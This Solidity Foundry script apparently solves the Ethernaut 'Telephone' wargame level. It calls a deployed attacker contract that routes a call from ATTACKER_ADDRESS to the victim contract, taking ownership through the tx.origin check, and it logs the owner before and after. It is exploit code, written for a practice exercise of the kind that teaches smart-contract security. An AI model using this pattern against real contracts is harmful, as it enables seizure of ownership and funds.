// SPDX-License-Identifier: MIT
pragma solidity ^0.6.2;

import {Script, console} from "forge-std/Script.sol";

import {Constants} from "./Constants.s.sol";
import {ITelephone, TelephoneAttack} from "./TelephoneAttacker.s.sol";

contract ExecuteTelephoneAttack is Constants, Script {
    function run() public {
        address attackContractAddr = vm.envAddress("ATTACK_CONTRACT");

        console.log("attackContractAddr: ", attackContractAddr);

        ITelephone victim = ITelephone(TELEPHONE_ADDRESS);
        TelephoneAttack attackContract = TelephoneAttack(attackContractAddr);
        
        console.log("Current owner:", victim.owner());
        console.log("Executing attack...");
        
        // This creates the proper call chain: ATTACKER_ADDRESS -> TelephoneAttack -> Telephone
        vm.startBroadcast(ATTACKER_ADDRESS);
        attackContract.attack(victim, ATTACKER_ADDRESS);
        vm.stopBroadcast();
        
        console.log("Attack completed!");
        console.log("New owner:", victim.owner());
    }
}
